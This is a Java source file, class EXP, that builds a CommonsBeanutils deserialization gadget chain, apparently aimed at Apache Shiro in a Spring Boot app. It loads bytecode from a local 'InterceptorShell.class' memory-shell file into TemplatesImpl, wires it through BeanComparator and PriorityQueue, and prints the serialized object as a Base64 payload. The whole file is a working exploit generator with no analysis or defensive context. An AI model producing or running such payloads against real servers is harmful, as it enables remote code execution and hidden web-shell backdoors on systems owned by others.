package com.butler.springboot14shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import javax.xml.transform.TransformerConfigurationException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

public class EXP {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("D://tmp//memshell//InterceptorShell.class"));
        byte[][] evilcodes = {bytes};
        setFiledValue(templates, "_bytecodes", evilcodes);
        setFiledValue(templates, "_class", null);
        setFiledValue(templates, "_name", "1diOt9");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());


        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        setFiledValue(beanComparator, "property", "outputProperties");
        setFiledValue(priorityQueue, "queue", new Object[] {templates, templates});

        ser(priorityQueue);

    }

    public static void setFiledValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }

    public static void ser(Object obj) throws NoSuchFieldException, IllegalAccessException, IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
        String s = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(s);
    }
}
